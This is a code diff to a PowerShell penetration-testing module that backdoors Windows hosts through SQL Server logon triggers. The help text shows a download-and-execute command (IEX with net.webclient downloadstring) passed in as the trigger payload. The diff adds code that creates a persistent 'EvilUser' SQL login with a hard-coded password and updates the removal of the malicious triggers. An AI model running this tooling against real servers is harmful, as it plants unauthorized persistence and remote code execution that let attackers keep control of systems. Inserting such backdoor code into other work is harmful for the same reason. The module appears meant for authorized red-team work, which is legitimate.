@@ -2,7 +2,7 @@ function Invoke-SqlServer-Persist-TriggerLogon
 {
     <#
 	.SYNOPSIS
-	This script can be used backdoor a Windows system using SQL Server logon triggers.
+	This script can be used backdoor a Windows system using SQL Serverlogon triggers.
 
 	.DESCRIPTION
 	This script can be used backdoor a Windows system using a SQL Server logon triggers.
@@ -30,7 +30,7 @@ function Invoke-SqlServer-Persist-TriggerLogon
 	PS C:\> Invoke-SqlServer-Persist-TriggerLogon -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -PsCommand "IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1')"
 	
 	.EXAMPLE
-	Remove evil_DDL_trigger as the current Windows user.
+	Remove evil logon triggers as the current Windows user.
 
 	PS C:\> Invoke-SqlServer-Persist-TriggerLogon -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -Remove
 
@@ -41,8 +41,6 @@ function Invoke-SqlServer-Persist-TriggerLogon
 	.NOTES
 	Author: Scott Sutherland - 2016, NetSPI
 	Version: Invoke-SqlServer-Persist-TriggerLogon.psm1 v1.0
-	todo
-	need to add evil user logon before adding trigger
     #>
 
   [CmdletBinding()]
@@ -281,6 +279,30 @@ function Invoke-SqlServer-Persist-TriggerLogon
         $SvcAdmin = 0 
     }
 
+    # -------------------------------------------------------
+    # Add User for Logon triggers
+    # -------------------------------------------------------
+    if(($NewSqlUser) -or ($PsCommand) -or ($NewOsUser)){
+
+        # Status user
+        Write-Host "[*] Adding EvilUser with password Password123! to be used with logon trigger..." 
+
+        # Create query
+        $Query = "IF NOT EXISTS (SELECT * FROM sys.syslogins WHERE name = 'EvilUser')
+        exec('CREATE LOGIN ''EvilUser'' WITH PASSWORD = ''Password123!'';')"
+
+        # Open db connection
+        $conn.Open()
+
+        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+        $results = $cmd.ExecuteReader() 
+        
+        # Close db connection
+        $conn.Close()
+
+        Write-Host "[*] The EvilUser has been been added." -foreground "green"
+    }
+
     # -------------------
     # Setup the pscommand
     # -------------------
@@ -443,7 +465,9 @@ function Invoke-SqlServer-Persist-TriggerLogon
 
         # Setup query 
         $Query = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_logon_trigger') 
-        DROP TRIGGER [evil_logon_trigger] ON ALL SERVER"
+        DROP TRIGGER [evil_logon_trigger_addsysadmin] ON ALL SERVER;
+        DROP TRIGGER [evil_logon_trigger_addosadmin] ON ALL SERVER;
+        DROP TRIGGER [evil_logon_trigger_pscmd] ON ALL SERVER;"
 
         $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
         $results = $cmd.ExecuteReader() 
